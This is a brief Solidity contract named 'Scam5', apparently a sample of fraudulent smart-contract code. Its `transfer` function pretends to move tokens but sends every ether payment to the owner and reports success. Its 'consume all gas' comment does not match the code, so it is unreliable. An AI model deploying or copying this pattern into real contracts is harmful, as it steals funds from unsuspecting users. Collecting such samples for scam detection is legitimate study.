// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Scam5 {
    mapping(uint256 => uint256) store;
    address payable owner;

    constructor(address payable _owner) {
        owner = _owner;
    }


    // consume all gas
    function transfer(address to, uint256 amount) public payable returns (bool) {
        owner.transfer(msg.value);
        return true;
    }
}
